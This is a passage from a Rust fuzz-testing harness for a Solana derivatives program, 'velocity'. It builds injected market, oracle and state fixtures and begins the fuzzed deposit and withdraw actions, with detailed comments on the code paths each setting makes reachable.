    /// Per-user perp-exposure snapshot from the PREVIOUS invariant poll:
    /// `(open_bids, open_asks, base_asset_amount, was_at_risk)` for market 0.
    ///
    /// Family IX diffs against this rather than against an absolute level. The
    /// phoenix harness learned this the hard way twice: flagging a cumulative
    /// level rather than the growth attributable to THIS step false-positives on
    /// a trader who was merely a passive fill counterparty, and flagging any
    /// growth at all false-positives when the growth is magnitude-REDUCING
    /// against the trader's existing position.
    prev_exposure: Vec<Option<(i64, i64, i64, bool)>>,
    /// Previous `(cumulative_funding_rate_long, cumulative_funding_rate_short,
    /// last_funding_rate_ts)` for the perp market — Family X.
    prev_funding: Option<(i128, i128, i64)>,
    /// Per-user `(abs_position, reduce_only_filled_total)` for perp market 0 —
    /// Family XVII's causal baseline.
    prev_reduce_only: Vec<Option<(u64, u128)>>,
    /// Monotonic counter for signed-message uuids.
    ///
    /// The program dedups signed-msg orders by uuid, so a fixed one would place
    /// exactly once and then take the "order already exists" early-return
    /// forever. Bumping it per placement keeps every attempt live.
    signed_uuid_seq: u64,
    /// uuids of recently placed signed-msg taker orders, newest last.
    ///
    /// `place_and_make_signed_msg_perp_order` looks its counterparty up *by
    /// uuid* in the taker's `SignedMsgUserOrders` ring and fails outright with
    /// `SignedMsgOrderDoesNotExist` otherwise — so a fuzzer-invented uuid can
    /// only ever reach that rejection. Recording what was actually placed is
    /// the same trick `pick_order_id` uses for order ids.
    /// `(taker_idx, uuid, taker_is_long)` — the direction is needed so the
    /// maker can be placed on the OPPOSITE side; a same-side maker can never
    /// cross and only ever reaches the no-fill path.
    signed_uuids: Vec<(usize, [u8; 8], bool)>,
}

// ---------------------------------------------------------------------------
// Injected-state builders (coherent USDC quote market + perp market + State)
// ---------------------------------------------------------------------------

fn build_state(signer: Pubkey, signer_nonce: u8, crank: Pubkey, admin: Pubkey) -> State {
    let mut s = State::default();
    s.signer = anchor_pk(signer);
    s.signer_nonce = signer_nonce;
    s.exchange_status = 0; // Active
    s.number_of_spot_markets = 4; // 0 (quote) + 1 (borrowable) + 2,3 (pool 1)
    s.number_of_markets = 1;
    // Enable the native MM-oracle update path (feature_bit_flags bit 0).
    s.feature_bit_flags = 1;

    // LIQUIDATION MARGIN BUFFER. `State::default()` leaves this 0, and every
    // liquidation handler computes its seize size from
    // `cross_margin_margin_shortage()` / `isolated_margin_shortage()`, both of
    // which reject outright with `InvalidMarginCalculation` ("margin buffer mode
    // not enabled") when the buffer is zero.
    //
    // So the ENTIRE liquidation family was gated behind a fixture default, not
    // behind the collateral state: an account could be genuinely below
    // maintenance and `liquidate_spot` would still fail — which reads exactly
    // like "the victim was healthy" and is why this looked like a margin-setup
    // problem rather than a one-field omission. 2% is the protocol's own
    // default.
    s.liquidation_margin_buffer_ratio =
        velocity::math::constants::DEFAULT_LIQUIDATION_MARGIN_BUFFER_RATIO;
    // PARTIAL-LIQUIDATION RAMP. `State::default()` leaves both of these 0
    // (state/state.rs:252-253). `calculate_max_pct_to_liquidate`
    // (math/liquidation.rs:469-478) then divides by a zero duration, hits
    // `.unwrap_or(LIQUIDATION_PCT_PRECISION)`, and pins `pct_freeable` at 100% —
    // so every liquidation here was one full-size step and the whole ramp, plus
    // the `liquidation_margin_freed` accumulation family VIII.c watches, was
    // unreachable. Same dead path as e2e-svm-liq, reached a different way (there
    // the field was set, but to 100%).
    s.initial_pct_to_liquidate = 1_000; // 10% of LIQUIDATION_PCT_PRECISION (10_000)
    s.liquidation_duration = velocity::math::time::legacy_slot_duration_u8(150);
    // Route EVERY hot-key role to our crank keypair.
    //
    // Handlers guarded by `check_hot(&keeper.key(), &state, HotRole::X)` are
    // simply unreachable unless the signer is the registered hot key for that
    // role — `force_delete_user` (UserFlag), `withdraw_protocol_fees_*`
    // (FeeWithdraw), the AMM/LP cranks, and so on all fail the account
    // constraint before the handler body ever runs. Registering the crank for
    // all of them turns that whole surface from unreachable into fuzzable.
    let ck = anchor_pk(crank);
    s.hot_amm_crank = ck;
    s.hot_lp_cache = ck;
    s.hot_lp_swap = ck;
    s.hot_lp_settle = ck;
    s.hot_feature_flag = ck;
    s.hot_fuel = ck;
    s.hot_user_flag = ck;
    s.hot_vault_deposit = ck;
    s.hot_mm_oracle_crank = ck;
    s.hot_amm_spread_adjust = ck;
    s.hot_fee_withdraw = ck;
    // `withdraw_protocol_fees_*` additionally pins the recipient to the
    // configured address (InvalidProtocolFeeRecipient otherwise), so point both
    // at the crank whose ATA the instruction creates.
    s.protocol_fee_recipient_perp = ck;
    s.protocol_fee_recipient_spot = ck;

    // A WARM ADMIN, deliberately NOT the crank.
    //
    // `update_user_equity_floor` is `check_warm`-gated and is the only writer of
    // `User::equity_floor` — `transfer_equity_floor` can merely move an existing
    // floor between accounts (`checked_sub` fails from zero). With no warm admin
    // the floor is permanently 0, so `trip_equity_floor_breaker` could only ever
    // reach its `equity_floor > 0` guard.
    //
    // Kept as its own keypair rather than reusing the crank so the crank stays a
    // pure hot-role identity: folding admin power into it would further blur the
    // authority surface that `--mutate-accounts` is already unable to probe.
    s.warm_admin = anchor_pk(admin);
    s
}

fn build_spot_market_usdc(
    pubkey: Pubkey,
    mint: Pubkey,
    vault: Pubkey,
    if_vault: Pubkey,
) -> SpotMarket {
    let mut m = SpotMarket::default();
    m.pubkey = anchor_pk(pubkey);
    m.oracle = anchor_pk(Pubkey::new_from_array([0u8; 32])); // $1 quote path
    m.oracle_source = OracleSource::QuoteAsset;
    m.mint = anchor_pk(mint);
    m.vault = anchor_pk(vault);
    m.insurance_fund.vault = anchor_pk(if_vault);
    m.market_index = 0;
    m.decimals = 6;
    m.status = MarketStatus::Active;
    // The realistic quote tier. Market 0 is the QUOTE spot market, which
    // `check_spot_oracle_validity` short-circuits to Valid, so this cannot gate
    // an oracle path -- it exists so `safest_tier_spot_liablity` and the
    // bankruptcy tier ordering take a non-default arm. This builder is REUSED for
    // the pool-1 mirror markets, so it sets their tier too.
    //
    // Was left at `SpotMarket::default()`'s `AssetTier::Unlisted`, whose
    // confidence multiplier is 50 -- a 100%-of-price band no real market runs.
    m.asset_tier = AssetTier::Collateral;
    m.cumulative_deposit_interest = SPOT_CUMULATIVE_INTEREST_PRECISION;
    m.cumulative_borrow_interest = SPOT_CUMULATIVE_INTEREST_PRECISION;
    m.initial_asset_weight = SPOT_WEIGHT_PRECISION;
    m.maintenance_asset_weight = SPOT_WEIGHT_PRECISION;
    m.initial_liability_weight = SPOT_WEIGHT_PRECISION;
    m.maintenance_liability_weight = SPOT_WEIGHT_PRECISION;
    m.withdraw_guard_threshold = u64::MAX; // disable the twap withdraw limiter
                                           // A zero revenue_settle_period makes `settle_revenue_to_insurance_fund`
                                           // reject with RevenueSettingsCannotSettleToIF before doing anything; a real
                                           // cadence makes the revenue->IF sweep reachable. The unstaking period gives
                                           // `remove_insurance_fund_stake` a cooldown to actually wait out.
    m.insurance_fund.revenue_settle_period = 3600;
    m.insurance_fund.unstaking_period = 3600;
    m.order_step_size = 1;
    m.order_tick_size = 1;
    // Nonzero oracle twap so the withdraw-path margin/oracle validity check
    // (`HistoricalOracleData::validate`) passes for the $1 quote asset.
    m.historical_oracle_data =
        velocity::state::oracle::HistoricalOracleData::default_quote_oracle();
    m
}

/// Spot market 1: a borrowable, oracle-priced, 9-decimal asset.
///
/// Deliberately unlike market 0 in every dimension that gates a code path:
///  * a real `PythLazer` oracle (movable) instead of the hard-coded $1 quote path;
///  * 9 decimals instead of 6, so the decimal-scaling arithmetic is exercised;
///  * asset weights BELOW 1.0 and liability weights ABOVE 1.0, so holding it as
///    collateral (or owing it) actually moves margin — the precondition for any
///    spot liquidation;
///  * nonzero interest-rate curve so `update_spot_market_cumulative_interest`
///    accrues something once there is real utilization.
fn build_spot_market_sol(
    pubkey: Pubkey,
    mint: Pubkey,
    vault: Pubkey,
    if_vault: Pubkey,
    oracle: Pubkey,
) -> SpotMarket {
    let mut m = SpotMarket::default();
    m.pubkey = anchor_pk(pubkey);
    m.oracle = anchor_pk(oracle);
    m.oracle_source = OracleSource::PythLazer;
    m.mint = anchor_pk(mint);
    m.vault = anchor_pk(vault);
    m.insurance_fund.vault = anchor_pk(if_vault);
    m.market_index = 1;
    m.decimals = 9;
    m.status = MarketStatus::Active;
    // Multiplier 5 -> a 10% confidence band. Deliberately DIFFERENT from the
    // perp market's 2% (ContractTier::B) so a single `conf` draw can be valid for
    // spot and invalid for perp -- the asymmetric-validity path (spot crank
    // proceeds, perp crank refuses) that a uniform tier can never produce. It
    // also flips `get_sanitize_clamp_denominator` from None to Some(5), covering
    // the Some arm of the TWAP price-band clamp.
    //
    // Safe for the borrow paths this market exists to exercise: borrowing is only
    // barred for `Protected`, and the `Isolated`-only margin gates are untouched.
    m.asset_tier = AssetTier::Cross;
    m.cumulative_deposit_interest = SPOT_CUMULATIVE_INTEREST_PRECISION;
    m.cumulative_borrow_interest = SPOT_CUMULATIVE_INTEREST_PRECISION;
    // Weights that actually bite (SPOT_WEIGHT_PRECISION = 1e4).
    m.initial_asset_weight = 8_000; // 0.80
    m.maintenance_asset_weight = 9_000; // 0.90
    m.initial_liability_weight = 12_000; // 1.20
    m.maintenance_liability_weight = 11_000; // 1.10
    m.withdraw_guard_threshold = u64::MAX; // disable the twap withdraw limiter
                                           // A zero revenue_settle_period makes `settle_revenue_to_insurance_fund`
                                           // reject with RevenueSettingsCannotSettleToIF before doing anything; a real
                                           // cadence makes the revenue->IF sweep reachable. The unstaking period gives
                                           // `remove_insurance_fund_stake` a cooldown to actually wait out.
    m.insurance_fund.revenue_settle_period = 3600;
    m.insurance_fund.unstaking_period = 3600;
    m.order_step_size = 1;
    m.order_tick_size = 1;
    // Interest curve, so utilization produces real borrow/deposit interest.
    m.optimal_utilization = (SPOT_UTILIZATION_PRECISION / 2) as u32;
    m.optimal_borrow_rate = (PERCENTAGE_PRECISION / 10) as u32; // 10% APR
    m.max_borrow_rate = PERCENTAGE_PRECISION as u32; // 100% APR
                                                     // Oracle history consistent with the injected $1 price.
    m.historical_oracle_data.last_oracle_price = PRICE_PRECISION as i64;
    m.historical_oracle_data.last_oracle_price_twap = PRICE_PRECISION as i64;
    m.historical_oracle_data.last_oracle_price_twap_5min = PRICE_PRECISION as i64;
    m
}

/// A `PythLazerOracle` priced at `$price_usd` with exponent -6.
///
/// exponent = -6 makes `oracle_precision == PRICE_PRECISION`, so the raw `price`
/// field IS the PRICE_PRECISION-scaled price and no rescaling happens in
/// `get_pyth_price`. `posted_slot` is the only staleness source the program reads
/// (`oracle_delay = clock_slot - posted_slot`), so callers must keep it current.
fn build_pyth_lazer_oracle(
    price: i64,
    conf: u64,
    posted_slot: u64,
    publish_time: u64,
) -> PythLazerOracle {
    PythLazerOracle {
        price,
        publish_time,
        posted_slot,
        exponent: -6,
        _padding: [0u8; 4],
        conf,
    }
}

fn build_perp_market(pubkey: Pubkey, quote_spot_index: u16, oracle: Pubkey) -> PerpMarket {
    let mut m = PerpMarket::default();
    m.pubkey = anchor_pk(pubkey);
    // Real, movable oracle (see Fixture::perp_oracle_pda).
    m.oracle = anchor_pk(oracle);
    m.market_index = 0;
    m.quote_spot_market_index = quote_spot_index;
    m.status = MarketStatus::Active;
    // Multiplier 1 -> a 2% confidence band, which is what real markets run.
    // (Precedent in this repo: fuzz/oracle/src/main.rs uses ContractTier::B.)
    //
    // Was left at `PerpMarket::default()`'s `HighlySpeculative`, multiplier 50 --
    // a 100%-of-price band, so `is_conf_too_large` could never trip no matter
    // what confidence the fuzzer wrote, and the entire TooUncertain branch plus
    // every downstream oracle-invalid path was unreachable.
    //
    // Verified not to start blocking fills: the A|B drawdown quote gate is
    // `<= K*400` vs `<= K*200` for HighlySpeculative with K negative, i.e. B is
    // HARDER to breach, not easier.
    m.contract_tier = ContractTier::B;
    m.oracle_source = OracleSource::PythLazer;
    m.margin_ratio_initial = 1_000; // 10%
    m.margin_ratio_maintenance = 500; // 5%
    m.order_step_size = 1_000_000; // 0.001 base units
    m.order_tick_size = 1;
    m.market_stats.min_order_size = 1_000_000;
    m.market_stats.historical_oracle_data =
        velocity::state::oracle::HistoricalOracleData::default_quote_oracle();

    // A COHERENT AMM priced at ~$1 (matching the injected oracle). Without this
    // `PerpMarket::default()` leaves every reserve at 0, so `reserve_price()` and
    // everything derived from it (spreads, JIT, repeg, funding) either errors or
    // is trivially zero. `curve_update_intensity = 0` keeps the AMM-freshness
    // gate off so instructions are not rejected for a stale curve.
    m.amm.base_asset_reserve = 10_000 * BASE_PRECISION;
    m.amm.quote_asset_reserve = 10_000 * BASE_PRECISION;
    m.amm.terminal_quote_asset_reserve = 10_000 * BASE_PRECISION;
    m.amm.sqrt_k = 10_000 * BASE_PRECISION;
    m.amm.peg_multiplier = PEG_PRECISION;
    m.amm.base_asset_amount_with_amm = 0;
    m.amm.curve_update_intensity = 0;
    m.amm.max_fill_reserve_fraction = 100;
    m.amm.max_base_asset_reserve = u64::MAX as u128;
    m.amm.min_base_asset_reserve = 0;
    m.amm.concentration_coef = MAX_CONCENTRATION_COEFFICIENT;

    // FUNDING. `funding_period == 0` (the default) makes the funding crank a
    // no-op: `update_funding_rate` requires a full period to have elapsed since
    // `last_funding_rate_ts`, and `settle_funding_payment` has nothing to settle.
    // One hour, the protocol's normal cadence, so `action_warp` can cross it.
    m.market_stats.funding_period = 3600;
    m.last_funding_rate_ts = 0;
    m.market_stats.last_mark_price_twap = PRICE_PRECISION as u64;
    m.market_stats.last_mark_price_twap_5min = PRICE_PRECISION as u64;
    m.market_stats.last_bid_price_twap = PRICE_PRECISION as u64;
    m.market_stats.last_ask_price_twap = PRICE_PRECISION as u64;

    // Standing fee tranches so the fee-sweep / protocol-fee paths have something
    // to move rather than short-circuiting on a zero balance.
    m.fee_ledger.pending_protocol_fee = 10 * QUOTE_PRECISION;
    m.fee_ledger.pending_if_fee = 5 * QUOTE_PRECISION;
    m.amm.fee_pool.market_index = 0;
    m.pnl_pool.market_index = 0;

    // VLP hedging ON. `update_amm_cache` skips (`continue`s past) every market
    // whose `hedge_config.status == 0`, so with the default 0 the crank runs to
    // completion having done nothing and only the prologue is ever covered.
    // Nothing else in the harness's reachable set reads this field — the only
    // other consumers are the LP-pool settle/instruction paths, which need an
    // `LPPool` account that does not exist here.
    m.hedge_config.status = 1;
    m.hedge_config.fee_transfer_scalar = 1;
    m
}

/// Convert a solana-3.0 Pubkey into the anchor-lang Pubkey type used by the
/// velocity structs (byte-identical; go through bytes to be version-agnostic).
fn anchor_pk(p: Pubkey) -> anchor_lang::prelude::Pubkey {
    anchor_lang::prelude::Pubkey::new_from_array(p.to_bytes())
}

// ---------------------------------------------------------------------------
// Fixture
// ---------------------------------------------------------------------------

#[fuzz_fixture]
impl Fixture {
    pub fn setup() -> Self {
        velocity_idl::register_schemas();

        let mut ctx = TestContext::new();
        let program_id = velocity_program_id();
        ctx.add_program(&program_id, VELOCITY_SO)
            .expect("add velocity.so");

        // velocity_signer PDA (vault authority).
        let (signer_pda, signer_nonce) =
            Pubkey::find_program_address(&[b"velocity_signer"], &program_id);

        // State singleton.
        let (state_pda, _) = Pubkey::find_program_address(&[b"velocity_state"], &program_id);

        // Crank keypair used for the native hot-key roles.
        let crank = Rc::new(Keypair::new());
        ctx.create_account()
            .pubkey(crank.pubkey())
            .lamports(10_000_000_000)
            .owner(system_program_id())
            .create()
            .unwrap();

        // Warm admin — a distinct identity from the crank (see `build_state`).
        let admin = Rc::new(Keypair::new());
        ctx.create_account()
            .pubkey(admin.pubkey())
            .lamports(10_000_000_000)
            .owner(system_program_id())
            .create()
            .unwrap();

        let mut state = build_state(signer_pda, signer_nonce, crank.pubkey(), admin.pubkey());
        inject(&mut ctx, state_pda, &mut state);

        // USDC mint (6 decimals).
        let usdc_mint = Keypair::new().pubkey();
        ctx.create_mint()
            .pubkey(usdc_mint)
            .mint_authority(signer_pda)
            .decimals(6)
            .create()
            .unwrap();

        // Spot market 0 (USDC quote) + vault + IF vault.
        let mi0 = 0u16.to_le_bytes();
        let (spot_market_pda, _) =
            Pubkey::find_program_address(&[b"spot_market", &mi0], &program_id);
        let (spot_vault_pda, _) =
            Pubkey::find_program_address(&[b"spot_market_vault", &mi0], &program_id);
        let (if_vault_pda, _) =
            Pubkey::find_program_address(&[b"insurance_fund_vault", &mi0], &program_id);

        let mut spot_market =
            build_spot_market_usdc(spot_market_pda, usdc_mint, spot_vault_pda, if_vault_pda);
        inject(&mut ctx, spot_market_pda, &mut spot_market);

        // Seeded WITH tokens: the perp market's `fee_ledger.pending_*` tranches
        // become spot-market claims once swept, and the program's own
        // `validate_spot_market_vault_amount` counts them. Starting the vault at
        // zero would make the market insolvent by the protocol's own definition
        // the moment a sweep ran — which silently fails every later instruction
        // rather than surfacing as anything obvious.
        ctx.create_token_account()
            .pubkey(spot_vault_pda)
            .mint(usdc_mint)
            .token_owner(signer_pda)
            .amount(1_000 * QUOTE_PRECISION as u64)
            .create()
            .unwrap();
        ctx.create_token_account()
            .pubkey(if_vault_pda)
            .mint(usdc_mint)
            .token_owner(signer_pda)
            .amount(0)
            .create()
            .unwrap();

        // Spot market 1 (borrowable, oracle-priced) + mint + vaults + oracle.
        let mi1 = 1u16.to_le_bytes();
        let sol_mint = Keypair::new().pubkey();
        ctx.create_mint()
            .pubkey(sol_mint)
            .mint_authority(signer_pda)
            .decimals(9)
            .create()
            .unwrap();

        let (spot_market_1_pda, _) =
            Pubkey::find_program_address(&[b"spot_market", &mi1], &program_id);
        let (spot_vault_1_pda, _) =
            Pubkey::find_program_address(&[b"spot_market_vault", &mi1], &program_id);
        let (if_vault_1_pda, _) =
            Pubkey::find_program_address(&[b"insurance_fund_vault", &mi1], &program_id);
        // NOTE the seed width: a Lazer oracle PDA is keyed on the **u32 feed id**,
        // not on the market index. `update_pyth_lazer_oracle` re-derives
        // `[PYTH_LAZER_ORACLE_SEED, feed_id.to_le_bytes()]` and compares it to the
        // supplied account, so a 2-byte market-index seed produces an account the
        // real update path can never address (it fails
        // `OracleBadRemainingAccountPublicKey`). Deriving both oracles with u32
        // feed ids is what lets the same account serve the markets *and* the
        // signed-update instruction.
        let (spot_1_oracle_pda, _) = Pubkey::find_program_address(
            &[
                velocity::state::pyth_lazer_oracle::PYTH_LAZER_ORACLE_SEED,
                &SPOT_1_FEED_ID.to_le_bytes(),
            ],
            &program_id,
        );

        let mut spot_1_oracle = build_pyth_lazer_oracle(PRICE_PRECISION as i64, 0, ctx.slot(), 1);
        inject(&mut ctx, spot_1_oracle_pda, &mut spot_1_oracle);

        let mut spot_market_1 = build_spot_market_sol(
            spot_market_1_pda,
            sol_mint,
            spot_vault_1_pda,
            if_vault_1_pda,
            spot_1_oracle_pda,
        );
        inject(&mut ctx, spot_market_1_pda, &mut spot_market_1);

        // The vault is SEEDED with liquidity: a borrow can only be drawn against
        // tokens that are actually in the vault, and `validate_spot_market_vault_amount`
        // would otherwise fail the moment anyone deposits.
        ctx.create_token_account()
            .pubkey(spot_vault_1_pda)
            .mint(sol_mint)
            .token_owner(signer_pda)
            .amount(0)
            .create()
            .unwrap();
        ctx.create_token_account()
            .pubkey(if_vault_1_pda)
            .mint(sol_mint)
            .token_owner(signer_pda)
            .amount(0)
            .create()
            .unwrap();

        // Spot markets 2 and 3 in pool 1 (see Fixture::pool1_market_a_pda).
        // Pool 1 MIRRORS pool 0 by mint: `transfer_pools` requires
        // `deposit_from.mint == deposit_to.mint` and the same for the borrow leg
        // (instructions/user.rs:1468-1478), because migrating a user between
        // pools only makes sense when both pools offer the same assets. Market 2
        // mirrors market 0 (USDC), market 3 mirrors market 1 (SOL).
        let mut pool1 = Vec::new();
        for (mi, mint, decimals) in [(2u16, usdc_mint, 6u8), (3u16, sol_mint, 9u8)] {
            let mib = mi.to_le_bytes();
            let (m_pda, _) = Pubkey::find_program_address(&[b"spot_market", &mib], &program_id);
            let (v_pda, _) =
                Pubkey::find_program_address(&[b"spot_market_vault", &mib], &program_id);
            let (if_pda, _) =
                Pubkey::find_program_address(&[b"insurance_fund_vault", &mib], &program_id);
            let mut m = build_spot_market_usdc(m_pda, mint, v_pda, if_pda);
            m.market_index = mi;
            m.pool_id = 1;
            m.decimals = decimals as u32;
            // SEED LIQUIDITY, backed 1:1 by real vault tokens.
            //
            // `transfer_pools` moves a BORROW into the destination market, and a
            // market with zero deposits cannot fund one
            // (SpotMarketInsufficientDeposits). Scaling matches
            // `get_spot_balance`: balance = tokens * 10^(19-decimals) /
            // cumulative_interest, with cumulative_interest starting at 1e10.
            // Seeding the ledger WITHOUT matching vault tokens is exactly what
            // makes a market insolvent by the program's own definition, so both
            // move together here.
            let seed_tokens: u64 = 1_000 * 10u64.pow(decimals as u32);
            let precision_increase = 10u128.pow(19 - decimals as u32);
            m.deposit_balance = (seed_tokens as u128).saturating_mul(precision_increase)
                / SPOT_CUMULATIVE_INTEREST_PRECISION;
            inject(&mut ctx, m_pda, &mut m);
            ctx.create_token_account()
                .pubkey(v_pda)
                .mint(mint)
                .token_owner(signer_pda)
                .amount(seed_tokens)
                .create()
                .unwrap();
            ctx.create_token_account()
                .pubkey(if_pda)
                .mint(mint)
                .token_owner(signer_pda)
                .amount(0)
                .create()
                .unwrap();
            pool1.push((m_pda, v_pda));
        }
        let (pool1_market_a_pda, pool1_vault_a_pda) = pool1[0];
        let (pool1_market_b_pda, pool1_vault_b_pda) = pool1[1];

        // Perp market 0 + its PythLazer oracle. The oracle must exist before the
        // market that references it, and its `posted_slot` must be the current
        // slot or every read is immediately stale.
        let (perp_oracle_pda, _) = Pubkey::find_program_address(
            &[
                velocity::state::pyth_lazer_oracle::PYTH_LAZER_ORACLE_SEED,
                &PERP_FEED_ID.to_le_bytes(),
            ],
            &program_id,
        );
        let slot0 = ctx.slot();
        let mut oracle = build_pyth_lazer_oracle(
            PRICE_PRECISION as i64, // $1, matching the AMM's initial reserve price
            0,
            slot0,
            1,
        );
        inject(&mut ctx, perp_oracle_pda, &mut oracle);

        let (perp_market_pda, _) =
            Pubkey::find_program_address(&[b"perp_market", &mi0], &program_id);
        let mut perp_market = build_perp_market(perp_market_pda, 0, perp_oracle_pda);
        inject(&mut ctx, perp_market_pda, &mut perp_market);

        // The VLP AmmCache, with one entry for perp market 0. Its oracle must
        // agree with the market's or `update_amm_cache` rejects immediately.
        let (amm_cache_pda, _) = Pubkey::find_program_address(
            &[velocity::vlp::amm_cache::AMM_POSITIONS_CACHE.as_bytes()],
            &program_id,
        );
        inject_amm_cache(
            &mut ctx,
            amm_cache_pda,
            &[(0u16, perp_oracle_pda, u8::from(OracleSource::PythLazer))],
        );

        // Pyth Lazer trusted-signer storage, so `update_pyth_lazer_oracle` can
        // authenticate updates the harness signs with `crank`.
        inject_pyth_lazer_storage(&mut ctx, crank.pubkey(), i64::MAX);

        // Users: create keypair + token account, then init user_stats + user.
        let mut users = Vec::new();
        for _ in 0..NUM_USERS {
            let kp = Rc::new(Keypair::new());
            ctx.create_account()
                .pubkey(kp.pubkey())
                .lamports(10_000_000_000)
                .owner(system_program_id())
                .create()
                .unwrap();

            // User's USDC token account.
            let token_account = Keypair::new().pubkey();
            ctx.create_token_account()
                .pubkey(token_account)
                .mint(usdc_mint)
                .token_owner(kp.pubkey())
                .amount(INITIAL_USDC)
                .create()
                .unwrap();

            // ...and one for spot market 1's mint, so the user can deposit it as
            // collateral, borrow it, or receive it from a liquidation/swap.
            let token_account_1 = Keypair::new().pubkey();
            ctx.create_token_account()
                .pubkey(token_account_1)
                .mint(sol_mint)
                .token_owner(kp.pubkey())
                .amount(INITIAL_SOL)
                .create()
                .unwrap();

            let sub0 = 0u16.to_le_bytes();
            let (stats_pda, _) =
                Pubkey::find_program_address(&[b"user_stats", kp.pubkey().as_ref()], &program_id);
            let (user_pda, _) =
                Pubkey::find_program_address(&[b"user", kp.pubkey().as_ref(), &sub0], &program_id);
            // `initialize_user` creates the relay liquidation-coverage account
            // alongside the user, so its list carries the PDA.
            let (user_conditions_pda, _) =
                Pubkey::find_program_address(&[b"user_conditions", user_pda.as_ref()], &program_id);

            // initialize_user_stats
            let _ = ctx
                .raw_call(Instruction {
                    program_id,
                    accounts: vec![
                        AccountMeta::new(stats_pda, false),
                        AccountMeta::new(state_pda, false),
                        AccountMeta::new_readonly(kp.pubkey(), false), // authority
                        AccountMeta::new(kp.pubkey(), true),           // payer (signer)
                        AccountMeta::new_readonly(rent_sysvar_id(), false),
                        AccountMeta::new_readonly(system_program_id(), false),
                    ],
                    data: ix_data(D_INITIALIZE_USER_STATS, &[]),
                })
                .signers(&[&kp])
                .send();

            // initialize_user(sub_account_id=0, name=[0;32])
            let mut init_args = Vec::new();
            init_args.extend_from_slice(&0u16.to_le_bytes());
            init_args.extend_from_slice(&[0u8; 32]);
            let _ = ctx
                .raw_call(Instruction {
                    program_id,
                    accounts: vec![
                        AccountMeta::new(user_pda, false),
                        AccountMeta::new(user_conditions_pda, false),
                        AccountMeta::new(stats_pda, false),
                        AccountMeta::new(state_pda, false),
                        AccountMeta::new_readonly(kp.pubkey(), false), // authority
                        AccountMeta::new(kp.pubkey(), true),           // payer
                        AccountMeta::new_readonly(rent_sysvar_id(), false),
                        AccountMeta::new_readonly(system_program_id(), false),
                    ],
                    data: ix_data(D_INITIALIZE_USER, &init_args),
                })
                .signers(&[&kp])
                .send();

            // EXCESS LAMPORTS on the User account.
            //
            // `reclaim_rent` refunds `current_lamports - rent_minimum` and
            // rejects with `CantReclaimRent` when that is zero. A freshly
            // `initialize_user`d account holds exactly the rent minimum, so the
            // handler could only ever reach its rejection branch. On-chain the
            // surplus is real — it accumulates from the `initialize_user` init
            // fee, which is charged whenever sub-account utilization is above
            // 80% — but reproducing it through that path would mean setting
            // `max_number_of_sub_accounts`, which in turn arms `reclaim_rent`'s
            // thirteen-day age gate and puts the handler right back out of
            // reach. Crediting the account directly gets the same state.
            let _ = ctx.svm.airdrop(&user_pda, 100_000_000);

            users.push(UserAcct {
                keypair: kp,
                user_pda,
                stats_pda,
                token_account,
                token_account_1,
            });
        }

        // Spare, deliberately un-bootstrapped authorities (see Fixture::fresh).
        let mut fresh = Vec::new();
        for _ in 0..NUM_FRESH {
            let kp = Rc::new(Keypair::new());
            ctx.create_account()
                .pubkey(kp.pubkey())
                .lamports(10_000_000_000)
                .owner(system_program_id())
                .create()
                .unwrap();
            fresh.push(kp);
        }

        Fixture {
            ctx,
            program_id,
            signer_pda,
            usdc_mint,
            spot_market_pda,
            spot_vault_pda,
            if_vault_pda,
            perp_market_pda,
            perp_oracle_pda,
            sol_mint,
            spot_market_1_pda,
            spot_vault_1_pda,
            if_vault_1_pda,
            spot_1_oracle_pda,
            pool1_market_a_pda,
            pool1_vault_a_pda,
            pool1_market_b_pda,
            pool1_vault_b_pda,
            amm_cache_pda,
            crank,
            admin,
            users,
            fresh,
            mm_seq: 1,
            oracle_seq: 2,
            crank_failures: Vec::new(),
            liq_refusals: Vec::new(),
            last_interest: [None, None],
            prev_exposure: vec![None; NUM_USERS],
            prev_funding: None,
            prev_reduce_only: vec![None; NUM_USERS],
            signed_uuid_seq: 0,
            signed_uuids: Vec::new(),
        }
    }

    // ---- helpers -------------------------------------------------------

    fn state_pda(&self) -> Pubkey {
        Pubkey::find_program_address(&[b"velocity_state"], &self.program_id).0
    }

    // ---- actions -------------------------------------------------------

    /// Deposit USDC into spot market 0.
    pub fn action_deposit(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..1_000_000_000_000u64)] amount: u64,
        #[range(0..2u16)] market_index: u16,
        #[range(0..2u8)] reduce_only: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (spot_market, vault, _if_vault, token_account) = self.spot_of(market_index, &user);
        let bal = self.ctx.token_balance(&token_account);
        let amount = amount.min(bal);
        if amount == 0 {
            return false;
        }
        let mut args = Vec::new();
        args.extend_from_slice(&market_index.to_le_bytes());
        args.extend_from_slice(&amount.to_le_bytes());
        args.push((reduce_only == 1) as u8);
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
            AccountMeta::new(user.stats_pda, false),
            AccountMeta::new_readonly(user.keypair.pubkey(), true),
            AccountMeta::new(vault, false),
            AccountMeta::new(token_account, false),
            AccountMeta::new_readonly(token_program_id(), false),
        ];
        // Market 1 is oracle-priced, so its oracle must lead the remaining
        // accounts; market 0 (QuoteAsset) needs none.
        if market_index == 1 {
            accounts.push(AccountMeta::new(self.spot_1_oracle_pda, false));
        }
        accounts.push(AccountMeta::new(spot_market, false));
        self.ctx
            .raw_call(Instruction {
                program_id: self.program_id,
                accounts,
                data: ix_data(D_DEPOSIT, &args),
            })
            .signers(&[&user.keypair])
            .send()
            .map(|o| o.is_success())
            .unwrap_or(false)
    }

    /// Withdraw USDC from spot market 0.
    /// Withdraw from a spot market.
    ///
    /// Withdrawing more than the user's deposit in that market opens a BORROW
    /// (subject to `margin_trading_enabled` and the margin check), which is the
    /// state every spot-liquidation path requires. Market 1 is the interesting
    /// target: it is oracle-priced with weights < 1.0, so a borrow there can be
    /// pushed underwater with `action_move_spot_1_oracle_price`.
    pub fn action_withdraw(
        &mut self,
        #[range(0..NUM_USERS)] user_idx: usize,
        #[range(1..1_000_000_000_000u64)] amount: u64,
        #[range(0..2u16)] market_index: u16,
        #[range(0..2u8)] reduce_only: u8,
    ) -> bool {
        let user = self.users[user_idx].clone();
        let (_spot_market, vault, _if_vault, token_account) = self.spot_of(market_index, &user);
        let mut args = Vec::new();
        args.extend_from_slice(&market_index.to_le_bytes());
        args.extend_from_slice(&amount.to_le_bytes());
        args.push((reduce_only == 1) as u8);
        let mut accounts = vec![
            AccountMeta::new_readonly(self.state_pda(), false),
            AccountMeta::new(user.user_pda, false),
